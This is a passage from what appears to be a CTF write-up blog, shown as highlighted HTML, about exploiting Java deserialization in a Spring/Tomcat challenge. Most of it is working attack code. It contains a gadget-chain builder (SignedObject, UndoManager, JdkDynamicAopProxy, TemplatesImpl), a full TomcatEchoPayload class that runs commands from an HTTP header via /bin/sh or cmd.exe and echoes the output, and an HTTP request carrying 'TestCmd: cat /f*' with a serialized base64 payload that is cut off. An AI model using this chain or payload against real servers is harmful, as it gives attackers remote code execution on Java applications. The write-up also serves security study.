class_">SignedObject</span>(hashMap, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray1.add(signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">badAttributeValueExpException1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(jsonArray1);</span><br><span class="line">        setFieldValue(badAttributeValueExpException1, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">        arrayList.add(badAttributeValueExpException1);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(arrayList);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(DatatypeConverter.printHexBinary(barr.toByteArray()));</span><br><span class="line">        System.out.println(java.util.Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">myObjectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        myObjectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeTemplatesImplAopProxy</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(TomcatEchoPayload.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TomcatEchoPayload&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>TomcatEchoPayload</code>这个类是使用的<code>ysomap</code>里面这个比较基本的类，不过要自己写在同一目录</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2021/6/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEchoPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TomcatEchoPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        transletVersion = <span class="number">101</span>;</span><br><span class="line">        Object o;</span><br><span class="line">        Object resp;</span><br><span class="line">        String s;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">done</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ts.length; i++) &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> ts[i];</span><br><span class="line">            <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s = t.getName();</span><br><span class="line">            <span class="keyword">if</span> (!s.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; s.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                o = getFV(t, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    o = getFV(getFV(getFV(o, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                java.util.<span class="type">List</span> <span class="variable">ps</span> <span class="operator">=</span> (java.util.List) getFV(o, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; ps.size(); j++) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> ps.get(j);</span><br><span class="line">                    o = getFV(p, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    resp = o.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]).invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">                    s = (String) o.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Testecho&quot;</span>&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (s != <span class="literal">null</span> &amp;&amp; !s.isEmpty()) &#123;</span><br><span class="line">                        resp.getClass().getMethod(<span class="string">&quot;setStatus&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">200</span>)&#125;);</span><br><span class="line">                        resp.getClass().getMethod(<span class="string">&quot;addHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, String.class&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Testecho&quot;</span>, s&#125;);</span><br><span class="line">                        done = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    s = (String) o.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Testcmd&quot;</span>&#125;);</span><br><span class="line">                    <span class="keyword">if</span> (s != <span class="literal">null</span> &amp;&amp; !s.isEmpty()) &#123;</span><br><span class="line">                        resp.getClass().getMethod(<span class="string">&quot;setStatus&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">200</span>)&#125;);</span><br><span class="line">                        String[] cmd = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, s&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, s&#125;;</span><br><span class="line">                        writeBody(resp, <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes());</span><br><span class="line">                        done = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ((s == <span class="literal">null</span> || s.isEmpty()) &amp;&amp; done) &#123;</span><br><span class="line">                        writeBody(resp, System.getProperties().toString().getBytes());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (done) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (done) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeBody</span><span class="params">(Object resp, <span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Object o;</span><br><span class="line">        Class clazz;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = Class.forName(<span class="string">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);</span><br><span class="line">            o = clazz.newInstance();</span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;setBytes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;)</span><br><span class="line">                    .invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs, <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Integer</span>(bs.length)&#125;);</span><br><span class="line">            resp.getClass().getMethod(<span class="string">&quot;doWrite&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clazz&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;o&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            clazz = Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class="line">            o = clazz.getDeclaredMethod(<span class="string">&quot;wrap&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(clazz, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            resp.getClass().getMethod(<span class="string">&quot;doWrite&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clazz&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;o&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            clazz = Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class="line">            o = clazz.getDeclaredMethod(<span class="string">&quot;wrap&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(clazz, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">            resp.getClass().getMethod(<span class="string">&quot;doWrite&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clazz&#125;).invoke(resp, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;o&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object o, String s)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> o.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                f = clazz.getDeclaredField(s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(s);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行得到字节码打入即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/deser</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.vnteam.cn:44391</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>commentposter=baozongwi; postermail=2405758945%40qq.com; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1</span><br><span class="line"><span class="attribute">TestCmd</span><span class="punctuation">: </span>cat /f*</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-twig"><span class="language-xml">payload=</span><span class="template-variable">&#123;&#123;urlencode(rO<span class="number">0</span>ABXNyABNqYXZhLnV<span class="number">0</span>aWwuQXJyYXlMaXN<span class="number">0</span>eIHSHZnHYZ<span class="number">0</span>DAAFJAARzaXpleHAAAAACdwQAAAACc<span class="number">3</span>IAGmphdmEuc<span class="number">2</span>VjdXJpdHkuU<span class="number">2</span>lnbmVkT<span class="number">2</span>JqZWN<span class="number">0</span>Cf+<span class="number">9</span>aCo<span class="number">81</span>f<span class="number">8</span>CAANbAAdjb<span class="number">250</span>ZW<span class="number">50</span>dAACW<span class="number">0</span>JbAAlzaWduYXR<span class="number">1</span>cmVxAH<span class="number">4</span>AA<span class="number">0</span>wADHRoZWFsZ<span class="number">29</span>yaXRobXQAEkxqYXZhL<span class="number">2</span>xhbmcvU<span class="number">3</span>RyaW<span class="number">5</span>nO<span class="number">3</span>hwdXIAAltCrPMX+AYIVOACAAB<span class="number">4</span>cAAAHwOs<span class="number">7</span>QAFc<span class="number">3</span>IAEWphdmEudXRpbC<span class="number">5</span>IYXNoTWFwBQfawcMWYNEDAAJGAApsb<span class="number">2</span>FkRmFjdG<span class="number">9</span>ySQAJdGhyZXNob<span class="number">2</span>xkeHA/QAAAAAAADHcIAAAAEAAAAAFzfQAAAAEAHWphdmF<span class="number">4</span>LnhtbC<span class="number">50</span>cmFuc<span class="number">2</span>Zvcm<span class="number">0</span>uVGVtcGxhdGVzeHIAF<span class="number">2</span>phdmEubGFuZy<span class="number">5</span>yZWZsZWN<span class="number">0</span>LlByb<span class="number">3</span>h<span class="number">54</span>SfaIMwQQ<span class="number">8</span>sCAAFMAAFodAAlTGphdmEvbGFuZy<span class="number">9</span>yZWZsZWN<span class="number">0</span>L<span class="number">0</span>ludm<span class="number">9</span>jYXRpb<span class="number">25</span>IYW<span class="number">5</span>kbGVyO<span class="number">3</span>hwc<span class="number">3</span>IANG<span class="number">9</span>yZy<span class="number">5</span>zcHJpbmdmcmFtZXdvcmsuYW<span class="number">9</span>wLmZyYW<span class="number">1</span>ld<span class="number">29</span>yay<span class="number">5</span>KZGtEeW<span class="number">5</span>hbWljQW<span class="number">9</span>wUHJveHlMxLRxDuuW/AIAA<span class="number">1</span>oADWVxdWFsc<span class="number">0</span>RlZmluZWRaAA<span class="number">9</span>oYXNoQ<span class="number">29</span>kZURlZmluZWRMAAdhZHZpc<span class="number">2</span>VkdAAyTG<span class="number">9</span>yZy<span class="number">9</span>zcHJpbmdmcmFtZXdvcmsvYW<span class="number">9</span>wL<span class="number">2</span>ZyYW<span class="number">1</span>ld<span class="number">29</span>yay<span class="number">9</span>BZHZpc<span class="number">2</span>VkU<span class="number">3</span>VwcG<span class="number">9</span>ydDt<span class="number">4</span>cAAAc<span class="number">3</span>IAMG<span class="number">9</span>yZy<span class="number">5</span>zcHJpbmdmcmFtZXdvcmsuYW<span class="number">9</span>wLmZyYW<span class="number">1</span>ld<span class="number">29</span>yay<span class="number">5</span>BZHZpc<span class="number">2</span>VkU<span class="number">3</span>VwcG<span class="number">9</span>ydCTLijz<span class="number">6</span>pMV<span class="number">1</span>AgAGWgALcHJlRmlsdGVyZWRbAAxhZHZpc<span class="number">29</span>yQXJyYXl<span class="number">0</span>ACJbTG<span class="number">9</span>yZy<span class="number">9</span>zcHJpbmdmcmFtZXdvcmsvYW<span class="number">9</span>wL<span class="number">0</span>Fkdmlzb<span class="number">3</span>I<span class="number">7</span>TAATYWR<span class="number">2</span>aXNvckNoYWluRmFjdG<span class="number">9</span>yeXQAN<span class="number">0</span>xvcmcvc<span class="number">3</span>ByaW<span class="number">5</span>nZnJhbWV<span class="number">3</span>b<span class="number">3</span>JrL<span class="number">2</span>FvcC<span class="number">9</span>mcmFtZXdvcmsvQWR<span class="number">2</span>aXNvckNoYWluRmFjdG<span class="number">9</span>yeTtMAAhhZHZpc<span class="number">29</span>yc<span class="number">3</span>QAEExqYXZhL<span class="number">3</span>V<span class="number">0</span>aWwvTGlzdDtMAAppbnRlcmZhY<span class="number">2</span>VzcQB+AAxMAAx<span class="number">0</span>YXJnZXRTb<span class="number">3</span>VyY<span class="number">2</span>V<span class="number">0</span>ACZMb<span class="number">3</span>JnL<span class="number">3</span>NwcmluZ<span class="number">2</span>ZyYW<span class="number">1</span>ld<span class="number">29</span>yay<span class="number">9</span>hb<span class="number">3</span>AvVGFyZ<span class="number">2</span>V<span class="number">0</span>U<span class="number">291</span>cmNlO<span class="number">3</span>hyAC<span class="number">1</span>vcmcuc<span class="number">3</span>ByaW<span class="number">5</span>nZnJhbWV<span class="number">3</span>b<span class="number">3</span>JrLmFvcC<span class="number">5</span>mcmFtZXdvcmsuUHJveHlDb<span class="number">25</span>maWeLS/Pmp+D<span class="number">3</span>bwIABVoAC<span class="number">2</span>V<span class="number">4</span>cG<span class="number">9</span>zZVByb<span class="number">3</span>h<span class="number">5</span>WgAGZnJvemVuWgAGb<span class="number">3</span>BhcXVlWgAIb<span class="number">3</span>B<span class="number">0</span>aW<span class="number">1</span>pemVaABBwcm<span class="number">94</span>eVRhcmdldENsYXNzeHAAAAAAAAB<span class="number">1</span>cgAiW<span class="number">0</span>xvcmcuc<span class="number">3</span>ByaW<span class="number">5</span>nZnJhbWV<span class="number">3</span>b<span class="number">3</span>JrLmFvcC<span class="number">5</span>BZHZpc<span class="number">29</span>yO<span class="number">9</span>+DDa<span class="number">3</span>SHoR<span class="number">0</span>AgAAeHAAAAAAc<span class="number">3</span>IAPG<span class="number">9</span>yZy<span class="number">5</span>zcHJpbmdmcmFtZXdvcmsuYW<span class="number">9</span>wLmZyYW<span class="number">1</span>ld<span class="number">29</span>yay<span class="number">5</span>EZWZhdWx<span class="number">0</span>QWR<span class="number">2</span>aXNvckNoYWluRmFjdG<span class="number">9</span>yeVTdZDfiTnH<span class="number">3</span>AgAAeHBzcgATamF<span class="number">2</span>YS<span class="number">51</span>dGlsLkFycmF<span class="number">5</span>TGlzdHiB<span class="number">0</span>h<span class="number">2</span>Zx<span class="number">2</span>GdAwABSQAEc<span class="number">2</span>l<span class="number">6</span>ZXhwAAAAAHcEAAAAAHhzcQB+ABQAAAAAdwQAAAAAeHNyADRvcmcuc<span class="number">3</span>ByaW<span class="number">5</span>nZnJhbWV<span class="number">3</span>b<span class="number">3</span>JrLmFvcC<span class="number">50</span>YXJnZXQuU<span class="number">2</span>luZ<span class="number">2</span>xldG<span class="number">9</span>uVGFyZ<span class="number">2</span>V<span class="number">0</span>U<span class="number">291</span>cmNlfVVu<span class="number">9</span>cf<span class="number">4</span>+roCAAFMAAZ<span class="number">0</span>YXJnZXR<span class="number">0</span>ABJMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">09</span>iamVjdDt<span class="number">4</span>cHNyADpjb<span class="number">20</span>uc<span class="number">3</span>VuLm<span class="number">9</span>yZy<span class="number">5</span>hcGFjaGUueGFsYW<span class="number">4</span>uaW<span class="number">50</span>ZXJuYWwueHNsdGMudHJheC<span class="number">5</span>UZW<span class="number">1</span>wbGF<span class="number">0</span>ZXNJbXBsCVdPwW<span class="number">6</span>sqzMDAAZJAA<span class="number">1</span>faW<span class="number">5</span>kZW<span class="number">50</span>TnVtYmVySQAOX<span class="number">3</span>RyYW<span class="number">5</span>zbGV<span class="number">0</span>SW<span class="number">5</span>kZXhbAApfYnl<span class="number">0</span>ZWNvZGVzdAADW<span class="number">1</span>tCWwAGX<span class="number">2</span>NsYXNzdAASW<span class="number">0</span>xqYXZhL<span class="number">2</span>xhbmcvQ<span class="number">2</span>xhc<span class="number">3</span>M<span class="number">7</span>TAAFX<span class="number">25</span>hbWV<span class="number">0</span>ABJMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">1</span>N<span class="number">0</span>cmluZztMABFfb<span class="number">3</span>V<span class="number">0</span>cHV<span class="number">0</span>UHJvcGVydGllc<span class="number">3</span>QAFkxqYXZhL<span class="number">3</span>V<span class="number">0</span>aWwvUHJvcGVydGllczt<span class="number">4</span>cAAAAAD/////dXIAA<span class="number">1</span>tbQkv<span class="number">9</span>GRVnZ<span class="number">9</span>s<span class="number">3</span>AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB<span class="number">4</span>cAAAFonK/rq+AAAANAEiCgBOAJUJAE<span class="number">0</span>AlgoAlwCYCgCXAJkIAJoKAE<span class="number">0</span>AmwcAawoAlwCcCACdCgAeAJ<span class="number">4</span>IAJ<span 